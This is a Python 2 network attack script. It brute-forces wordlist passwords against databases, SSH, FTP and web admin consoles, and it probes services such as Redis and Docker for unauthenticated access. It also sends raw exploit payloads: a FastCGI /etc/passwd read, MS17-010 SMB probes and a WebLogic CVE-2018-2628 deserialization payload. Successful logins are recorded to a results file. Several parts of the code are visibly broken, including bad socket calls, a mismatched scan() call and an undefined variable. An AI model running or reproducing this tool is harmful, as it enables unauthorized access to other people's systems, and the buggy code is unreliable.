# coding:utf-8
import re
import requests
import time
import random
import datetime
import pymongo
import pymysql
import pymssql
import psycopg2
import cx_Oracle
import paramiko
from ftplib import FTP
import urllib2
import base64
import socket
import httplib
import binascii
import base64
import multiprocessing
import sys
reload(sys)
sys.setdefaultencoding('utf-8')
timeout = 5
socket.setdefaulttimeout(timeout)

dic_user = list(set([x.replace('\n', '') for x in open('user.txt', 'r').readlines()]))
dic_pass = list(set([x.replace('\n', '') for x in open('password.txt', 'r').readlines()]))

def log(*args):
    with open('log.txt','a+')as aa:
        for x in args:
            aa.write(str(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())) + ':' + x + '\n')

def printf(*args):
    for x in args:
        print '[+] ' + str(time.strftime(" %H:%M:%S", time.localtime())) + '  当前检测 : ' + unicode(x,'utf-8')
        log(x)

def success(result,result_name):
    with open(result_name,'a+')as a:
        a.write(result + '\n')

def scan(ip,result_name):
    result_name = result_name
    try:
        printf('Mongodb数据库未授权访问漏洞 : ' + str(ip))
        log('Mongodb数据库未授权访问漏洞 : '+ str(ip))
        conn = pymongo.MongoClient(str(ip), 27017)
        dbname = conn.database_names()
        if dbname:
            res = 'Mongodb数据库未授权访问漏洞 : ' + str(ip) + ' : 27017'
            success(res,result_name)
            log(res)
    except Exception,e:
        log('[*] 异常状态 : ' + str(e))
    try:
        printf('Mongodb数据库未授权访问漏洞 : '+ str(ip))
        log('Mongodb数据库未授权访问漏洞 : '+ str(ip))
        conn = pymongo.MongoClient(str(ip), 27018)
        dbname = conn.database_names()
        if dbname:
            res = 'Mongodb数据库未授权访问漏洞 : ' + str(ip) + ' : 27018'
            success(res,result_name)
            log(res)
    except Exception,e:
        log('[*] 异常状态 : ' + str(e))


    try:
        printf('Mysql弱口令 : '+ str(ip))
        log('Mysql弱口令 : '+ str(ip))
        s = socket.socket()
        s.connect((str(ip),3306))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            for ppass in dic_pass:
                try:
                    connx = pymysql.connect(host=ip, user='root', passwd=str(ppass), db='test', port=3306)
                    res = 'Mysql弱口令 : ' + str(ip + ':3306|root|' + str(ppass))
                    success(res, result_name)
                    log(res)
                except Exception, e:
                    log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('Mssql弱口令 : '+ str(ip))
        log('Mssql弱口令 : '+ str(ip))
        s = socket.socket()
        s.connect((str(ip),1433))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            for ppass in dic_pass:
                try:
                    connx = pymssql.connect(server=str(ip), port=1433, user='sa', password=str(ppass))
                    res = 'Mssql弱口令 : ' + str(ip + ':1433|sa|' + str(ppass))
                    success(res, result_name)
                    log(res)
                except Exception, e:
                    log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('Postql弱口令 : '+ str(ip))
        log('Postql弱口令 : '+ str(ip))
        s = socket.socket()
        s.connect((str(ip),5432))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            for ppass in dic_pass:
                try:
                    connx = psycopg2.connect(host=ip, port=5432, user='postgres', password=ppass)
                    res = 'Postql弱口令 : ' + str(ip + ':5432|postgres|' + str(ppass))
                    success(res, result_name)
                    log(res)
                except Exception, e:
                    log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('Oralce弱口令 : '+ str(ip))
        log('Oralce弱口令 : '+ str(ip))
        s = socket.socket()
        s.connect((str(ip),1521))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            # oracle默认用户及密码
            oracle_user = ['sys', 'system', 'sysman', 'scott', 'aqadm', 'Dbsnmp']
            oracle_pass_default = ['', 'manager', 'oem_temp', 'tiger', 'aqadm', 'dbsnmp']
            for uuser in oracle_user:
                for ppass in oracle_pass_default:
                    try:
                        connx = cx_Oracle.connect(uuser, ppass, ip+':1521/orcl')
                        res = 'Oralce弱口令 : ' + str(ip + ':1521|' +str(uuser)+'|'+ str(ppass))
                        success(res, result_name)
                        log(res)
                    except Exception, e:
                        log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))


    try:
        printf('SSH弱口令 : '+ str(ip))
        log('SSH弱口令 : '+ str(ip))
        s = socket.socket()
        s.connect((str(ip), 22))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            for uuser in dic_user:
                for ppass in dic_pass:
                    try:
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(ip, port=22, username=uuser, password=ppass, timeout=10)
                        client.close()
                        res = 'SSH弱口令 : ' + str(ip + ':22|' + str(uuser) + '|' + str(ppass))
                        success(res, result_name)
                        log(res)
                    except Exception, e:
                        log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('FTP弱口令 : '+ str(ip))
        log('FTP弱口令 : '+ str(ip))
        s = socket.socket()
        s.connect((str(ip), 21))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            for uuser in dic_user:
                for ppass in dic_pass:
                    try:
                        ftp = FTP(ip)
                        ftp.connect(ip, 21)  # 连接 服务器名  端口号
                        ftp.login(str(uuser), str(ppass))
                        ftp.quit()  # ftpB.quit() #退出ftp服务器
                        res = 'FTP弱口令 : ' + str(ip + ':21|' + str(uuser) + '|' + str(ppass))
                        success(res, result_name)
                        log(res)
                    except Exception, e:
                        log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))


    try:
        printf('Redis数据库未授权访问漏洞 : ' + str(ip))
        log('Redis数据库未授权访问漏洞 : ' + str(ip))
        s = socket.socket()
        s.connect((str(ip), 6379))
        s.send("INFO\r\n")
        result = s.recv(1024)
        #此处应有检测代码
        if "redis_version" in result:
        #此处应有成功后结果
            res = 'Redis数据库未授权访问漏洞 : ' + str(ip) + ' : 6379'
            success(res,result_name)
            log(res)
    except Exception,e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('ZooKeeper未授权访问漏洞 : ' + str(ip))
        log('ZooKeeper未授权访问漏洞 : ' + str(ip))
        s = socket.socket()
        s.connect((str(ip), 2181))
        s.send("envi")
        result = s.recv(1024)
        if "zookeeper.version" in result:
            res = 'ZooKeeper未授权访问漏洞 : ' + str(ip) + ' : 2181'
            success(res, result_name)
            log(res)
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('Elasticsearch未授权访问漏洞 : ' + str(ip))
        log('Elasticsearch未授权访问漏洞 : ' + str(ip))
        conn = httplib.HTTPConnection(str(ip), 9200, True, timeout=5)
        conn.request("GET", '/_cat/master')
        resp = conn.getresponse()
        if resp.status == 200:
            res = 'Elasticsearch未授权访问漏洞 : ' + str(ip) + ' : 9200'
            success(res, result_name)
            log(res)
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))


    try:
        printf('Memcache未授权访问漏洞 : '+ str(ip))
        log('Memcache未授权访问漏洞 : '+ str(ip))
        s =socket.socket()
        s.connect((str(ip), 11211))
        s.send("stats")
        result = s.recv(1024)
        if "STAT version" in result:
            res = 'Memcache未授权访问漏洞 : ' + str(ip) + ' : 11211'
            success(res, result_name)
            log(res)
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))
    try:
        printf('Tomcat远程部署弱口令 : '+ str(ip))
        log('Tomcat远程部署弱口令 : '+ str(ip))
        r_=[]
        r3 = 'http://'+str(ip)+':8080/Manager/login.jsp'
        r4 = 'http://'+str(ip)+':8080/RetainServer/Manager/login.jsp'
        r_.append(r3)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=10)
                if 'onkeypress="if(event.keyCode==13)' in rxr.content:
                    for uuser in dic_user:
                        for ppass in dic_pass:
                            data={'login':str(uuser),'pass':str(ppass),'Language':'myLang'}
                            try:
                                r_br=requests.post(url=r_r,data=data,timeout=10)
                                if 'Router Configuration' in r_br.content:
                                    res = 'Tomcat远程部署弱口令 : ' + str(r_r + ':' + str(str(uuser) + '|' + str(ppass)))
                                    success(res, result_name)
                                    log(res)
                            except Exception, e:
                                log('[*] 异常状态 : ' + str(e))
            except Exception, e:
                log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('Tomcat后台管理弱口令 : '+ str(ip))
        log('Tomcat后台管理弱口令 : '+ str(ip))
        s = socket.socket()
        s.connect((str(ip),8080))
        s.send('langzi \n')
        cc = s.recv(1024)
        if 'not allowed to' not in cc:
            r_=[]
            r2 = 'http://'+str(ip)+':8080/manager/html'
            r4='http://' + str(ip) + ':8081/manager/html'
            r_.append(r2)
            r_.append(r4)
            for r_r in r_:
                try:
                    rxr = requests.get(url=r_r,timeout=5)
                    if 'Manager App HOW-TO' in rxr.content:
                        for uuser in dic_user:
                            for ppass in dic_pass:
                                headers = {'Authorization': 'Basic %s==' % (base64.b64encode(uuser + ':' + ppass))}
                                try:
                                    rxrx=requests.get(url=r_r,headers=headers,timeout=8)
                                    if rxrx.status_code==200:
                                        res = 'Tomcat远程部署弱口令 : ' + str(r_r + ':' + str(str(uuser) + '|' + str(ppass)))
                                        success(res, result_name)
                                        log(res)
                                except Exception, e:
                                    log('[*] 异常状态 : ' + str(e))
                except Exception, e:
                    log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('Docker未授权访问漏洞 : '+ str(ip))
        log('Docker未授权访问漏洞 : '+ str(ip))
        conn = httplib.HTTPConnection(str(ip), 2375, True, timeout=5)
        conn.request("GET", '/containers/json')
        resp = conn.getresponse()
        if resp.status == 200 and "HostConfig" in resp.read():
            res = 'Docker未授权访问漏洞 : ' + str(ip) + ' : 2375'
            success(res, result_name)
            log(res)
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('CouchDB未授权访问漏洞 : '+ str(ip))
        log('CouchDB未授权访问漏洞 : '+ str(ip))
        rr = requests.get(url=str('http://' + str(ip) + '/_config'), timeout=5)
        if "couch" in rr.content:
            res = 'CouchDB未授权访问漏洞 : ' + str(rr.url)
            success(res, result_name)
            log(res)
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('Jenkins未授权访问漏洞 : '+ str(ip))
        log('Jenkins未授权访问漏洞 : '+ str(ip))
        r_=[]
        r2 = 'http://' + str(ip) + '/manage '
        r4 = 'http://' + str(ip) + ':8080/manage '
        r_.append(r2)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=8)
                if 'arbitrary' in rxr.content:
                    res = 'Jenkins未授权访问漏洞 : ' + str(r_r)
                    success(res, result_name)
                    log(res)
            except Exception, e:
                log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))


    try:
        printf('Fast-Cgi文件读取漏洞 : '+ str(ip))
        log('Fast-Cgi文件读取漏洞 : '+ str(ip))
        s=socket.socket()
        s.connect(str(ip),9000)
        data = """
        01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
        01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53
        54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52
        56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50
        2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
        4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
        52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49
        50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f
        70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
        4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
        63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
        """
        data_s = ''
        for _ in data.split():
            data_s += chr(int(_, 16))
        s.send(data_s)
        try:
            ret = s.recv(1024)
            if ret.find(':root:') > 0:
                res = 'Fast-Cgi文件读取漏洞 : ' + str(ip) + ' : 9000'
                success(res, result_name)
                log(res)
        except Exception, e:
            log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('MS17-010 SMB远程溢出漏洞 : '+ str(ip))
        log('MS17-010 SMB远程溢出漏洞 : '+ str(ip))
        negotiate_protocol_request = binascii.unhexlify("00000054ff534d42720000000018012800000000000000000000000000002f4b0000c55e003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200")
        session_setup_request = binascii.unhexlify("00000063ff534d42730000000018012000000000000000000000000000002f4b0000c55e0dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000")
        s=socket.socket()
        s.connect(str(ip),445)
        s.send(negotiate_protocol_request)
        s.recv(1024)
        s.send(session_setup_request)
        data = s.recv(1024)
        user_id = data[32:34]
        tree_connect_andx_request = "000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff000000000001001a00005c5c%s5c49504324003f3f3f3f3f00" % ((58 + len(ip)), user_id.encode('hex'), ip.encode('hex'))
        s.send(binascii.unhexlify(tree_connect_andx_request))
        data = s.recv(1024)
        allid = data[28:36]
        payload = "0000004aff534d422500000000180128000000000000000000000000%s1000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00" % allid.encode('hex')
        s.send(binascii.unhexlify(payload))
        data = s.recv(1024)
        s.close()
        if "\x05\x02\x00\xc0" in data:
            res = 'MS17-010 SMB远程溢出漏洞 : ' + str(ip) + ' : 445'
            success(res, result_name)
            log(res)
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('Phpmyadmin弱口令 : '+ str(ip))
        log('Phpmyadmin弱口令 : '+ str(ip))
        r_=[]
        r3 = 'http://'+str(ip)+':8080/phpmyadmin/index.php'
        r5 = 'http://'+str(ip)+':999/phpmyadmin/index.php'
        r_.append(r3)
        r_.append(r5)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=10)
                if 'Documentation.html' in rxr.content:
                    for uuser in dic_user:
                        for ppass in dic_pass:
                            data={'pma_username':str(uuser),'pma_password':str(ppass)}
                            try:
                                r_br=requests.post(url=r_r,data=data,timeout=10)
                                if 'mainFrameset' in r_br.content:
                                    res = 'PHPmyadmin弱口令 : ' + str(r_r+':'+str(str(uuser)+'|'+str(ppass)))
                                    success(res, result_name)
                                    log(res)
                            except Exception, e:
                                log('[*] 异常状态 : ' + str(e))
            except Exception, e:
                log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('HTTP.sys远程代码执行漏洞 : '+ str(ip))
        log('HTTP.sys远程代码执行漏洞 : '+ str(ip))
        s=socket.socket()
        s.connect(str(ip),80)
        flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'Requested Range Not Satisfiable' in data and 'Server: Microsoft' in data:
            res = 'HTTP.sys远程代码执行漏洞 : ' + str(ip) + ' : 80'
            success(res, result_name)
            log(res)
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('Resin viewfile远程文件读取漏洞 : '+ str(ip))
        log('Resin viewfile远程文件读取漏洞 : '+ str(ip))
        r_=[]
        r2 = 'http://' + str(ip) + '/resin-doc/admin/index.xtp'
        r4 = 'http://' + str(ip) + ':8080/resin-doc/admin/index.xtp'
        r6 = 'http://' + str(ip) + ':8443/resin-doc/admin/index.xtp'
        r_.append(r2)
        r_.append(r4)
        r_.append(r6)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=8)
                if '/resin-doc/examples/index.xtp' in rxr.content:
                    res = 'Resin viewfile远程文件读取漏洞 : ' + str(ip)
                    success(res, result_name)
                    log(res)
            except Exception, e:
                log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('JBoss后台上传漏洞 : '+ str(ip))
        log('JBoss后台上传漏洞 : '+ str(ip))
        r_=[]
        r2 = 'http://' + str(ip) + '/jmx-console/'
        r4 = 'http://' + str(ip) + ':8080/jmx-console/'
        r_.append(r2)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=8)
                if 'flavor=URL,type=DeploymentScanner' in rxr.content:
                    res = 'JBoss后台上传漏洞 : ' + str(ip) + ' : 27018'
                    success(res, result_name)
                    log(res)
            except Exception, e:
                log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('Weblogic弱口令 : '+ str(ip))
        log('Weblogic弱口令 : '+ str(ip))
        r_=[]
        r2 = 'http://' + str(ip) + '/console/login/LoginForm.jsp'
        r4 = 'http://' + str(ip) + ':7001/console/login/LoginForm.jsp'
        r6 = 'https://' + str(ip) + '/console/login/LoginForm.jsp'
        r8 = 'https://' + str(ip) + ':7002/console/login/LoginForm.jsp'
        r_.append(r2)
        r_.append(r4)
        r_.append(r6)
        r_.append(r8)
        for r_r in r_:
            try:
                for uuser in dic_user:
                    for ppass in dic_pass:
                        data = {'j_username': str(uuser), 'j_password': str(ppass), 'j_character_encoding': 'GBK'}
                        rxr = requests.post(url=r_r,data=data,timeout=8)
                        if 'WebLogic Server Console' in rxr.content:
                            res = 'Weblogic弱口令 : ' + str(r_r + ':' + str(str(uuser) + '|' + str(ppass)))
                            success(res, result_name)
                            log(res)
            except Exception, e:
                log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('JOnAS弱口令 : '+ str(ip))
        log('JOnAS弱口令 : '+ str(ip))
        r_=[]
        r2 = 'http://' + str(ip) + '/jonasAdmin/ '
        r4 = 'http://' + str(ip) + ':9000/jonasAdmin/ '
        r6 = 'https://' + str(ip) + '/jonasAdmin/ '
        r8 = 'https://' + str(ip) + ':9000/jonasAdmin/ '
        r_.append(r2)
        r_.append(r4)
        r_.append(r6)
        r_.append(r8)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=10)
                if 'JOnAS Administration' in rxr.content:
                    for uuser in dic_user:
                        for ppass in dic_pass:
                            data = {'j_username': str(uuser), 'j_password': str(ppass)}
                            try:
                                r_br = requests.post(url=r_r, data=data, timeout=10)
                                if 'Deployment' in r_br.content:
                                    res = 'JOnAS弱口令 : ' + str(r_r + ':' + str(str(uuser) + '|' + str(ppass)))
                                    success(res, result_name)
                                    log(res)
                            except Exception, e:
                                log('[*] 异常状态 : ' + str(e))
            except Exception, e:
                log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('Weblogic CVE-2018-2628 : '+ str(ip))
        log('Weblogic CVE-2018-2628 : '+ str(ip))
        sock = socket.socket()
        VER_SIG = ['\\$Proxy[0-9]+']
        try:
            sock.connect((str(ip),7001))
            sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
            time.sleep(1)
        except Exception, e:
            pass
        try:
            data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
            data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077502100000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(7001))
            data3 = '1a7727000d3234322e323134'
            data4 = '2e312e32353461863d1d0000000078'
            for d in [data1, data2, data3, data4]:
                sock.send(d.decode('hex'))
        except Exception, e:
            pass
        try:
            payload = '0565080000000100000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
            payload += 'ACED0005737D00000001001D6A6176612E726D692E61637469766174696F6E2E416374697661746F72787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707372002D6A6176612E726D692E7365727665722E52656D6F74654F626A656374496E766F636174696F6E48616E646C657200000000000000020200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707737000A556E6963617374526566000E3030302E3030302E3030302E303000001B590000000001EEA90B00000000000000000000000000000078'
            payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
            payload = '%s%s' % ('{:08x}'.format(len(payload) / 2 + 4), payload)
            sock.send(payload.decode('hex'))
            res = ''
            try:
                for i in xrange(20):
                    res += sock.recv(4096)
                    time.sleep(1)
            except Exception as e:
                pass
        except Exception, e:
            pass
        try:
            p = re.findall(VER_SIG[0], res, re.S)
            if len(p) > 0:
                res = 'Weblogic CVE-2018-2628 : ' + str(ip) + ' : 7001'
                success(res, result_name)
                log(res)
        except Exception, e:
            log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('Glassfish弱口令 : '+ str(ip))
        log('Glassfish弱口令 : '+ str(ip))
        r_=[]
        r2 = 'http://' + str(ip) + ':4848'
        r_.append(r2)
        for xxixx in r_:
            error_i = 0
            flag_list = ['Just refresh the page... login will take over', 'GlassFish Console - Common Tasks',
                         '/resource/common/js/adminjsf.js">', 'Admin Console</title>', 'src="/homePage.jsf"',
                         'src="/header.jsf"', 'src="/index.jsf"', '<title>Common Tasks</title>',
                         'title="Logout from GlassFish']
            user_list = ['admin']
            for uuser in user_list:
                for ppass in dic_pass:
                    try:
                        PostStr = 'j_username=%s&j_password=%s&loginButton=Login&loginButton.DisabledHiddenField=true' % (uuser, ppass)
                        request = urllib2.Request(xxixx + '/j_security_check?loginButton=Login', PostStr)
                        res = urllib2.urlopen(request, timeout=timeout)
                        res_html = res.read()
                    except urllib2.HTTPError:
                        return
                    except urllib2.URLError:
                        error_i += 1
                        if error_i >= 3:
                            break
                        continue
                    for flag in flag_list:
                        if flag in res_html:
                            res = 'Glassfish弱口令 : ' + str(xxixx + ':' + str(str(uuser) + '|' + str(ppass)))
                            success(res, result_name)
                            log(res)
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))

    try:
        printf('Wordpress弱口令 : '+ str(ip))
        log('Wordpress弱口令 : '+ str(ip))
        flag_list = ['<name>isAdmin</name>', '<name>url</name>']
        for uuser in dic_user:
            for ppass in dic_pass:
                try:
                    login_path = '/xmlrpc.php'
                    PostStr = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall>  <methodName>wp.getUsersBlogs</methodName>  <params>   <param><value>%s</value></param>   <param><value>%s</value></param>  </params></methodCall>" % (uuser, ppass)
                    request = urllib2.Request('http://' + str(ip) + login_path, PostStr)
                    res = urllib2.urlopen(request, timeout=5)
                    res_html = res.read()
                    for flag in flag_list:
                        if flag in res_html:
                            res = 'Wordpress弱口令 : ' + str(xxixx + ':' +uuser+ '|' + ppass)
                            success(res, result_name)
                            log(res)
                except Exception, e:
                    log('[*] 异常状态 : ' + str(e))

    except Exception, e:
        log('[*] 异常状态 : ' + str(e))


    try:
        printf('Axis2弱口令 : '+ str(ip))
        log('Axis2弱口令 : '+ str(ip))
        r_=[]
        r3 = 'http://'+str(ip)+':9038/axis2-admin/login'
        r5 = 'http://'+str(ip)+':8080/axis2-admin/login'
        r_.append(r3)
        r_.append(r5)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=10)
                if 'action="axis2-admin/login' in rxr.content:
                    for uuser in dic_user:
                        for ppass in dic_pass:
                            data={'userName':str(uuser),'password':str(ppass),'submit':'Login'}
                            try:
                                r_br=requests.post(url=r_r,data=data,timeout=10)
                                if 'Upload Service' in r_br.content:
                                    res = 'Axis2弱口令 : ' + + str(r_r+':'+str(str(uuser)+'|'+str(ppass)))
                                    success(res, result_name)
                                    log(res)
                            except Exception, e:
                                log('[*] 异常状态 : ' + str(e))
            except Exception, e:
                log('[*] 异常状态 : ' + str(e))
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))





if __name__ == "__main__":
    multiprocessing.freeze_support()
    with open('log.txt', 'a+')as aa:
        aa.write(str(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())) + ' - ' + '弱口令扫描检测开始' + '\n')

    dic_user = list(set([x.replace('\n','') for x in open('user.txt','r').readlines()]))
    dic_pass = list(set([x.replace('\n','') for x in open('password.txt','r').readlines()]))

    printf('开始测试......')
    urltxt = raw_input(unicode('输入网址文本名(可拖拽进来) : ', 'utf-8').encode('gbk'))
    for x in urltxt:
        scan(x)
